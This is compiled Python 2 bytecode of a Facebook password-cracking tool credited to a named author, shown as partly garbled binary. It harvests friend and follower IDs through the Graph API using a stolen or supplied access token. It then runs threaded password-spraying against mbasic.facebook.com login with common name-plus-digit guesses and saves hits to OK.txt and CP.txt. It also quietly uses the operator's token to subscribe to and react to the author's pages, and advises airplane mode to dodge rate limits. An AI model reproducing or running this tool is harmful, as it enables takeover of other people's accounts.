ó
ýac           @   sn  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 e
 e  e j d  d  d l m Z y d  d l  Z  Wn e k
 rç e j d  n Xy d  d l Z Wn e k
 re j d  n Xy d  d l Z Wn e k
 rIe j d  n Xd Z d g Z e  j d	  j j   Z e  j d
 e d i d d 6d d 6d d 6j	   d j   Z d Z d Z d   Z d   Z d   Z d   a d   Z d   Z d   Z  d   Z! d   Z" d   Z# d   Z$ d   Z% d    Z& d!   Z' d"   Z( d#   Z) d$   Z* e+ d% k rjt   n  d S(&   iÿÿÿÿNs   utf-8(   t
   ThreadPools   pip2 install requestss   pip2 install mechanizes   pip2 install bs4s   https://mbasic.facebook.coms{  Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+s   https://api.ipify.orgs    https://ipapi.com/ip_api.php?ip=t   headerss   https://ip-api.com/t   Referers   application/json; charset=utf-8s   Content-Types|   Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36s
   User-Agentt   country_namesÚ  
[1;33m   ########  ####[1;31m  ######  [1;33m##     ## ##     ## 
[1;33m   ##     ##  ##  [1;31m##    ## [1;33m##     ## ##     ## 
[1;37m   ##     ##  ##  [1;31m##       [1;37m##     ## ##     ## 
[1;37m   ########   ##   [1;31m###### [1;37m ######### ##     ## 
[1;37m   ##   ##    ##        [1;31m## [1;37m##     ## ##     ## 
[1;33m   ##    ##   ##  [1;31m##    ## [1;33m##     ## ##     ## 
[1;33m   ##     ## ####  [1;31m###### [1;33m ##     ##  #######  
[1;37m-------------------------------------------------
[1;37m  â¤ AUTHOR  : RISHU KHAN 
[1;37m  â¤ GITHUB  : https://github.com/Alon3-Rishu
[1;37m  â¤ FB ID   : https://facebook.com/al3x.rishu
[1;37m-------------------------------------------------
[1;37mââââââââ[1;37mâ¬ [1;37m[1;41mðð½ ððð ð»âð¼ð¸ð ðð ððð âð¸â ð»ð ðð[0m[1;37m â¬ââââââââ
[1;37m-------------------------------------------------c          C   su   y  t  d d  j   }  t   WnN t t f k
 rp t j d  t GHd GHd GHd GHd GHd GHd GHt   n Xd  S(	   Ns   access_token.txtt   rt   clears   	      FACEBOOK LOGINs8   [1;37m-------------------------------------------------s   [1] FACEBOOK TOKEN LOGINs   [2] FACEBOOK ID/PASS LOGINs   [3] BACK(	   t   opent   readt   menut   KeyErrort   IOErrort   ost   systemt   logot
   log_select(   t   token(    (    s   Pro_X.pyt   login-   s    c          C   s   t  d  }  |  d k r" t   nd |  d k r8 t   nN |  d k rT t j d  n2 |  d k rp t j d  n d GHd	 GHd GHt   d  S(
   Ns   [?] Choose : t   1t   2t   5s%   xdg-open https://youtu.be/xN-l-dTj6aYt   6t   exitt    s   	Select valid option(   t	   raw_inputR   t   log_fbR   R   R   (   t   sel(    (    s   Pro_X.pyR   ;   s    

c          C   s@  t  j d  y  t d d  j   }  t   Wnt t f k
 r;t GHd GHd GHt d  } t d  } d GHt	 j
 d | d	 | d
 d t j } t j |  } d | k ræ t d d  } | j | d  | j   t   q<d | d k rd GHd GHd GHt j d  t   q<d GHd GHd GHt j d  n Xd  S(   NR   s   access_token.txtR   s   	     FACEBOOK ID/PASS LOGINs8   [1;37m-------------------------------------------------s
   [?] UID : s   [?] PASSWORD : s?   https://b-api.facebook.com/method/auth.login?format=json&email=s
   &password=sÔ  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=trueR   t   access_tokent   ws   www.facebook.comt   errorR   s   	Account has checkpointi   s   	Id/pass my be wrong(   R   R   R   R   R   R	   R
   R   R   t   requestst   gett   headert   textt   jsont   loadst   writet   closeR   t   timet   sleep(   R   t   uidt   passwt   datat   qt   sav(    (    s   Pro_X.pyR   J   s8    (


c          C   s   t  j d  y  t d d  j   }  t   Wnd t t f k
 r t GHd GHd GHt d  }  d GHt d d  } | j	 |   | j
   t   n Xd  S(   NR   s   access_token.txtR   s   	     LOGIN WITH TOKENs8   [1;37m-------------------------------------------------s   [?] PASTE TOKEN HERE : [1;37mR   (   R   R   R   R   R   R	   R
   R   R   R#   R$   (   R   R+   (    (    s   Pro_X.pyR   h   s    
c          C   s¹  t  j d  y t d d  j   }  Wn t t f k
 rF t   n XyË t j d |   } t j	 d |   t j	 d |   t j	 d |   t j	 d |   t j	 d	 |  d
 |   t j	 d |   t j	 d |   t j	 d |  d
 |   t
 j | j  } | d } WnF t k
 rZt GHd GHd GHt  j d  d GHt j d  t   n Xt  j d  t GHd | t f GHd GHd GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   access_token.txtR   s+   https://graph.facebook.com/me?access_token=s?   https://graph.facebook.com/1376599765/subscribers?access_token=sD   https://graph.facebook.com/100002324915713/subscribers?access_token=sD   https://graph.facebook.com/100000000464718/subscribers?access_token=sD   https://graph.facebook.com/100076835203956/subscribers?access_token=s=   https://graph.facebook.com/107375211862963/comments/?message=s   &access_token=sN   https://graph.facebook.com/10221476111076967/reactions?type=LOVE&access_token=sL   https://graph.facebook.com/361086152181730/reactions?type=LOVE&access_token=s=   https://graph.facebook.com/361086152181730/comments/?message=t   nameR   s   	Logged in token has expireds   rm -rf access_token.txti   sV   [[1;32mâ[1;37m] WELCOME : [1;32m%s [1;37m[[1;32mâ[1;37m] COUNTRY : [1;32m%ss8   [1;37m-------------------------------------------------s   [1] CRACK WITH AUTO PASSs   [2] CRACK WITH CHOICE PASS MENUs5   [3] RANDOM CRACKING MENU [[1;32mcomming soon[1;37m]s=   [4] RANDOM OLD IDS CRACKING MENU [[1;32mcomming soon[1;37m]sF   [5] EXTRACT IDS [[1;32mmake file[1;37m] [[1;32mcomming soon[1;37m]s   [6] FILE DUPLICATE ID CUTTERs   [7] HELP KE LIYE CONTACT KAREs   [0] EXIT TOOL(   R   R   R   R   R	   R
   R   R   R   t   postR!   R"   R    R   R%   R&   t   loct   menu_option(   R   R   R*   R,   (    (    s   Pro_X.pyR   w   sN    c          C   sØ   t  d  }  |  d k r" t   n² |  d k r8 t   n |  d k rN t   n |  d k rd t   np |  d k rz t   nZ |  d k r t   nD |  d k r¬ t j d	  n( |  d
 k rÈ t j d  n d GHt	   d  S(   Ns   [?] Choose : R   R   t   3t   4R   R   t   7s/   xdg-open https://www.facebook.com/MR.RISHU.KHANt   0R   s   	Select valid option(
   R   t   crackt   choicet   rant   oldt   exft   cutterR   R   R   (   t   select(    (    s   Pro_X.pyR/       s&    





c           C   s@   t  j d  t GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   	     CHOOSE PASS MENUs8   [1;37m-------------------------------------------------s   [1] CRACK WITH NAME+DIGIT PASSs   [2] CRACK WITH ONLY DIGIT PASSs   [3] CRACK WITH SINGLE PASSs   [0] BACK MENU(   R   R   R   t   log_sel(    (    (    s   Pro_X.pyR5   ·   s    c          C   s~   t  d  }  |  d k r" t   nX |  d k r8 t   nB |  d k rN t   n, |  d k rd t   n d GHd GHd GHt   d  S(   Ns   [?] Choose : R   R   R0   R   R   s   	Select valid option(   R   R,   t   digitt   singR   (   R   (    (    s   Pro_X.pyR;   Â   s    



c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not found i   s   	     CRACK WITH AUTO PASSs8   [1;37m-------------------------------------------------s   [1] CRACK PUBLIC IDs   [2] CRACK FOLLOWERSs   [3] CRACK MULTIPLE IDs   [4] FILE CLONINGs   [0] BACK(   R   R   R   R   R   R
   R%   R&   R   R   t   crack_select(    (    (    s   Pro_X.pyR4   Ò   s&    c             sò  t  d  }  g  } g   g    |  d k r\t j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd	 | d
 GHWn, t
 k
 rÚ d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xB| d D]B } | d } | d
 } | j d  d }	 | j | d |  qWnñ|  d k rt j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd	 | d
 GHWn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t d  } t j | j	  } x | d D]B } | d } | d
 } | j d  d }	 | j | d |  qUWn¯|  d k r<t j d  t GHd GHd GHyC t  d  }
 x0 t |
 d  j   D] } | j | j    qëWWqMt
 t f k
 r8d GHt  d  t   qMXn|  d k r!t j d  t GHd GHd GHt  d  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rÏd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d
 } | j d  d }	 | j | d |  qWt  d   } y1 t j d | d t  } t j | j	  } Wn, t
 k
 r¹d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d
 } | j d  d }	 | j | d |  qòWt  d!  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 r£d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d
 } | j d  d }	 | j | d |  qÜWt  d"  } yC t j d | d t  } t j | j	  } t j d  t GHWn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x} | d D]B } | d } | d
 } | j d  d }	 | j | d |  qØWn, |  d# k r7t   n d GHd$ GHd GHt   d% t t |   GHd& GHd GHd' GHd GH   f d(   } t d)  } | j | |  d* GHd+ GHd, t t    GHd- t t     GHd* GHt  d.  t   d  S(/   Ns   [?] Choose : R   R   s   	     AUTO PASS CRACKINGs8   [1;37m-------------------------------------------------s   [?] INPUT ID : s   https://graph.facebook.com/s   ?access_token=s   [+] CLONING FROM : [1;32mR,   s   	Invalid link OR tokenR   s   PRESS ENTER TO BACKs   /friends?access_token=R)   t   idt    i    t   |R   s   	Invalid id link OR tokens   /subscribers?access_token=s   &limit=999999R1   s   	     AUTO PASS FILE CRACKs   [?] INPUT FILE NAME : [1;32mR   s+   	    [1;31mRequested file not found[0;37ms    Press enter to back R0   s   [1] INPUT ID : s   [2] INPUT ID : s   [3] INPUT ID : s   [4] INPUT ID : R3   s   	SELECT VALID OPTIONs   [1;37m[$] TOTAL IDS :[1;92m s"   [1;37m[$] THE PROCESS HAS STARTEDs1   [1;32m     USE FLIGHT (AIRPLANE) MODE BEFORE USEc            sÄ	  |  } | j  d  \ } } t j t  } t j   } | j j i d d 6d d 6d d 6| d 6d	 d
 6d d 6d d 6 d } y9	| } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sÑ d |	 k r,d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nd |	 k rd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n"| j   j  d!  d" | j   j  d!  d# } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sd |	 k rid | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nLd |	 k rÐd | d | d GHt
 d  d  } | j | d | d  | j     j | |  nå| j   j  d!  d" d$ } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k s8d |	 k rd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n"d |	 k rúd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n»| j   j  d!  d" d% } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sbd |	 k r½d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nød |	 k r$d | d | d GHt
 d  d  } | j | d | d  | j     j | |  n| j   j  d!  d" d& } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sd |	 k rçd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nÎd |	 k rNd | d | d GHt
 d  d  } | j | d | d  | j     j | |  ng| j   j  d!  d" d' } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k s¶d |	 k rd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n¤d |	 k rxd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n=| j   j  d!  d" d( } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sàd |	 k r;d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nzd |	 k r¢d | d | d GHt
 d  d  } | j | d | d  | j     j | |  nd) } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sód |	 k rN	d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  ng d |	 k rµ	d | d | d GHt
 d  d  } | j | d | d  | j     j | |  n  Wn n Xd  S(*   NRA   s   mbasic.facebook.comt   Hosts	   max-age=0s   cache-controlR   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://mbasic.facebook.coms%   https://mbasic.facebook.com/login.phpR)   t   emailt   passt   submitR   t   mbasic_logout_buttons   save-devices   [1;92m[RISHU-SUCES] s    | s   [0;97ms   OK.txtt   as   
t
   checkpoints   [1;91m[RISHU-CHECK] s   CP.txtR@   i    i   s   @123t   123t   12345t   123456t   786t   786786(   t   splitt   randomR5   t   suaR   t   SessionR   t   updateR-   t   contentR   R#   R$   t   appendt   lower(   t   argt   userR'   R,   t	   sharagentt   sessiont   hostt   psR)   t   spt   okt   cpt   ps2t   ps3t   ps4t   ps5t   ps6t   ps7t   ps8(   t   cpst   oks(    s   Pro_X.pyt   main  s   A*	

0*	

*	

*	

*	

*	

*	

*	

i   s8   [1;97m-------------------------------------------------s$   [1;37m[$] PROCESS HAS BEEN COMPLETEs   [1;37m[$] TOTAL OK : [1;32ms   [1;37m[$] TOTAL CP : [1;31ms    [1;37mPRESS ENTER TO BACK MENU (   R   R   R   R   R   R   R   R!   R"   R    R	   R4   t   rsplitRU   R   t	   readlinest   stripR
   R   t   strt   lenR    t   map(   R:   R?   t   idtR   R*   t   zt   iR'   t   nat   nmt   filelistt   lineRi   t   p(    (   Rg   Rh   s   Pro_X.pyR>   ç   sB   















	




c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not foundi   s   	     CRACK WITH CHOICE PASSs8   [1;97m-------------------------------------------------s   [1] CRACK PUBLIC IDs   [2] CRACK FOLLOWERSs   [3] CRACK MULTIPLE IDs   [4] FILE CLONINGs   [0] BACK(   R   R   R   R   R   R
   R%   R&   R   R   t	   pro_rishu(    (    (    s   Pro_X.pyR,     s&    c             s  t  d  }  g  } g   g    |  d k rt j d  t GHd GHd GHt  d   t  d   t  d   t  d	   t  d
   t  d  } t  d   t  d   t  d   t  d  	 t  d  
 t  d   t  d   d GHt j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd | d GHWn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qÐWn$|  d" k rt j d  t GHd GHd GHt  d   t  d   t  d   t  d	   t  d
   t  d  } t  d   t  d   t  d   t  d  	 t  d  
 t  d   t  d   d GHt j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd | d GHWn, t
 k
 rd# GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qËWn)|  d$ k rot j d  t GHd% GHd GHt  d   t  d   t  d   t  d	   t  d
   t  d  } t  d   t  d   t  d   t  d  	 t  d  
 t  d   t  d   d GHt j d  t GHd GHd GHyC t  d&  } x0 t | d'  j   D] } | j | j    qWWn- t
 t f k
 rkd( GHt  d)  t   n XnÎ|  d* k r
t j d  t GHd GHd GHt  d   t  d   t  d   t  d	   t  d
   t  d  } t  d   t  d   t  d   t  d  	 t  d  
 t  d   t  d   d GHt j d  t GHd GHd GHt  d+  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 r¿d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qøWt  d,  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 r©d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qâWt  d-  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qÌWt  d.  } yC t j d | d t  } t j | j	  } t j d  t GHWn, t
 k
 r	d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d }	 |	 j d  d  }
 | j | d! |	  qÈ	Wn, |  d/ k r'
t   n d GHd0 GHd GHt   d1 t t |   GHd2 GHd GHd3 GHd4 GH          	 
    f d5   } t d6  } | j | |  d GHd7 GHd8 t t    GHd9 t t     GHd GHt  d:  t   d  S(;   Ns   [?] Choose : R   R   s   	     CHOICE PASS CRACKINGs8   [1;97m-------------------------------------------------s   [1] name+digit : s   [2] name+digit : s   [3] name+digit : s   [4] name+digit : s   [5] name+digit : s   [6] name+digit : s   [7] digit : s   [8] digit : s   [9] digit : s   [10] digit : s   [11] digit : s   [12] digit : s   [13] digit : s8   [1;37m-------------------------------------------------s   [?] INPUT ID : s   https://graph.facebook.com/s   ?access_token=s   [+] CLONING FROM : [1;92mR,   s   	Invalid link OR tokenR   s   PRESS ENTER TO BACKs   /friends?access_token=R)   R?   R@   i    RA   R   s   	Invalid id link OR tokenR1   s   	     CHOICE PASS FILE CRACKs   [?] INPUT FILE NAME : [1;92mR   s+   	    [1;38mRequested file not found[0;98ms    Press enter to back R0   s   [1] INPUT ID : s   [2] INPUT ID : s   [3] INPUT ID : s   [4] INPUT ID : R3   s   	SELECT VALID OPTIONs   [1;97m[$] TOTAL IDS :[1;92m s"   [1;97m[$] THE PROCESS HAS STARTEDs1   [1;93m     USE FLIGHT (AIRPLANE) MODE BEFORE USEs9   [1;97m--------------------------------------------------c            s6  |  } | j  d  \ } } t j t  } t j   } | j j i d d 6d d 6d d 6| d 6d	 d
 6d d 6d d 6 d } y«| } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sÑ d |	 k r,d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nûd |	 k rd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n| j   j  d!  d" | j   j  d!  d# } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sd |	 k rid | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n¾d |	 k rÐd | d | d GHt
 d  d  } | j | d | d  | j     j | |  nW| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k s8d |	 k rd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nd |	 k rúd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n-| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sbd |	 k r½d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  njd |	 k r$d | d | d GHt
 d  d  } | j | d | d  | j     j | |  n| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sd |	 k rçd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n@d |	 k rNd | d | d GHt
 d  d  } | j | d | d  | j     j | |  nÙ
| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k s¶d |	 k rd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n
d |	 k rxd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n¯	| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sàd |	 k r;d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nìd |	 k r¢d | d | d GHt
 d  d  } | j | d | d  | j     j | |  n| j   j  d!  d"  } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k s
	d |	 k re	d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  nÂd |	 k rÌ	d | d | d GHt
 d  d  } | j | d | d  | j     j | |  n[| j d d i | d 6 d 6d d 6} | j	 }	 d |	 k s
d |	 k rr
d | d  d GHt
 d d  }
 |
 j | d  d  |
 j    j |   nµd |	 k rÙ
d | d  d GHt
 d  d  } | j | d  d  | j     j |   nN| j d d i | d 6 d 6d d 6} | j	 }	 d |	 k s$d |	 k rd | d  d GHt
 d d  }
 |
 j | d  d  |
 j    j |   n¨d |	 k ræd | d  d GHt
 d  d  } | j | d  d  | j     j |   nA| j d d i | d 6 d 6d d 6} | j	 }	 d |	 k s1d |	 k rd | d  d GHt
 d d  }
 |
 j | d  d  |
 j    j |   nd |	 k ród | d  d GHt
 d  d  } | j | d  d  | j     j |   n4| j d d i | d 6	 d 6d d 6} | j	 }	 d |	 k s>d |	 k rd | d 	 d GHt
 d d  }
 |
 j | d 	 d  |
 j    j | 	  nd |	 k r d | d 	 d GHt
 d  d  } | j | d 	 d  | j     j | 	  n'| j d d i | d 6
 d 6d d 6} | j	 }	 d |	 k sKd |	 k r¦d | d 
 d GHt
 d d  }
 |
 j | d 
 d  |
 j    j | 
  nd |	 k rd | d 
 d GHt
 d  d  } | j | d 
 d  | j     j | 
  n| j d d i | d 6 d 6d d 6} | j	 }	 d |	 k sXd |	 k r³d | d  d GHt
 d d  }
 |
 j | d  d  |
 j    j |   ntd |	 k rd | d  d GHt
 d  d  } | j | d  d  | j     j |   n| j d d i | d 6 d 6d d 6} | j	 }	 d |	 k sed |	 k rÀd | d  d GHt
 d d  }
 |
 j | d  d  |
 j    j |   ng d |	 k r'd | d  d GHt
 d  d  } | j | d  d  | j     j |   n  Wn n Xd  S($   NRA   s   mbasic.facebook.comRB   s	   max-age=0s   cache-controlR   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8RC   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://mbasic.facebook.coms%   https://mbasic.facebook.com/login.phpR)   RD   RE   RF   R   RG   s   save-devices   [1;92m[RISHU-SUCES] s    | s   [0;97ms   OK.txtRH   s   
RI   s   [1;91m[RISHU-CHECK] s   CP.txtR@   i    i   (   RO   RP   R5   RQ   R   RR   R   RS   R-   RT   R   R#   R$   RU   RV   (   RW   RX   R'   R,   RY   RZ   R[   R\   R)   R]   R^   R_   R`   Ra   Rb   Rc   Rd   Re   Rf   (   Rg   Rh   t   p3t   p4t   p5t   p6t   p7t   ps10t   ps11t   ps12t   ps13t   ps14t   ps15t   ps9(    s   Pro_X.pyRi     sÆ   A*	

0*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

i   s$   [1;37m[$] PROCESS HAS BEEN COMPLETEs   [1;37m[$] TOTAL OK : [1;32ms   [1;37m[$] TOTAL CP : [1;31ms    [1;37mPRESS ENTER TO BACK MENU (   R   R   R   R   R   R   R   R!   R"   R    R	   R5   Rj   RU   R   Rk   Rl   R
   R4   R   Rm   Rn   R    Ro   (   t   rishuR?   t   p8Rp   R   R*   Rq   Rr   R'   Rs   Rt   Ru   Rv   Ri   Rw   (    (   Rg   Rh   Ry   Rz   R{   R|   R}   R~   R   R   R   R   R   R   s   Pro_X.pyRx   0  sÔ   















	



6ÿ 
c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not foundi   s   	     CRACK WITH DIGIT PASSs8   [1;97m-------------------------------------------------s   [1] CRACK PUBLIC IDs   [2] CRACK FOLLOWERSs   [3] CRACK MULTIPLE IDs   [4] FILE CLONINGs   [0] BACK(   R   R   R   R   R   R
   R%   R&   R   R   t   digit_rishu(    (    (    s   Pro_X.pyR<     s&    c             so  t  d  }  g  } g   g    |  d k r1t j d  t GHd GHd GHt  d   t  d  	 t  d  
 t  d	   t  d
   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   d GHt j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd | d GHWn, t
 k
 r¯d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x½| d D]B } | d  } | d } | j d!  d" }	 | j | d# |  qèWnl|  d$ k rDt j d  t GHd GHd GHt  d   t  d  	 t  d  
 t  d	   t  d
   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   d GHt j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd GHd | d GHWn, t
 k
 rÂd% GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xª| d D]B } | d  } | d } | j d!  d" }	 | j | d# |  qûWnY|  d& k r·t j d  t GHd' GHd GHt  d   t  d  	 t  d  
 t  d	   t  d
   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   d GHt j d  t GHd GHd GHyC t  d(  }
 x0 t |
 d)  j   D] } | j | j    qfWWq
t
 t f k
 r³d* GHt  d+  t   q
Xnæ|  d, k rq
t j d  t GHd GHd GHt  d   t  d  	 t  d  
 t  d	   t  d
   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   t  d   d GHt j d  t GHd GHd GHt  d-  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d  } | d } | j d!  d" }	 | j | d# |  qXWt  d.  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 r	d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d  } | d } | j d!  d" }	 | j | d# |  qBWt  d/  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 ród GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d  } | d } | j d!  d" }	 | j | d# |  q,	Wt  d0  } yC t j d | d t  } t j | j	  } t j d  t GHWn, t
 k
 rï	d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x} | d D]B } | d  } | d } | j d!  d" }	 | j | d# |  q(
Wn, |  d1 k r
t   n d GHd2 GHd GHt   d3 t t |   GHd4 GHd GHd5 GHd6 GH          	 
       f d7   } t d8  } | j | |  d GHd9 GHd: t t    GHd; t t     GHd GHt  d<  t   d  S(=   Ns   [?] Choose : R   R   s   	     CHOICE PASS CRACKINGs8   [1;97m-------------------------------------------------s   [1] Digit : s   [2] Digit : s   [3] Digit : s   [4] Digit : s   [5] Digit : s   [6] Digit : s   [7] Digit : s   [8] Digit : s   [9] Digit : s   [10] Digit : s   [11] Digit : s   [12] Digit : s   [13] Digit : s   [14] Digit : s   [15] Digit : s8   [1;37m-------------------------------------------------s   [?] INPUT ID : s   https://graph.facebook.com/s   ?access_token=s   [+] CLONING FROM : [1;92mR,   s   	Invalid link OR tokenR   s   PRESS ENTER TO BACKs   /friends?access_token=R)   R?   R@   i    RA   R   s   	Invalid id link OR tokenR1   s   	     CHOICE PASS FILE CRACKs   [?] INPUT FILE NAME : [1;92mR   s+   	    [1;38mRequested file not found[0;98ms    Press enter to back R0   s   [1] INPUT ID : s   [2] INPUT ID : s   [3] INPUT ID : s   [4] INPUT ID : R3   s   	SELECT VALID OPTIONs   [1;97m[$] TOTAL IDS :[1;92m s"   [1;97m[$] THE PROCESS HAS STARTEDs1   [1;93m     USE FLIGHT (AIRPLANE) MODE BEFORE USEs9   [1;97m--------------------------------------------------c            sR  |  } | j  d  \ } } t j t  } t j   } | j j i d d 6d d 6d d 6| d 6d	 d
 6d d 6d d 6 d } yÇ| j d d i | d 6 d 6d d 6} | j	 } d | k sË d | k r&d | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nd | k rd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n¶| j d d i | d 6	 d 6d d 6} | j	 } d | k sØd | k r3d | d 	 d GHt
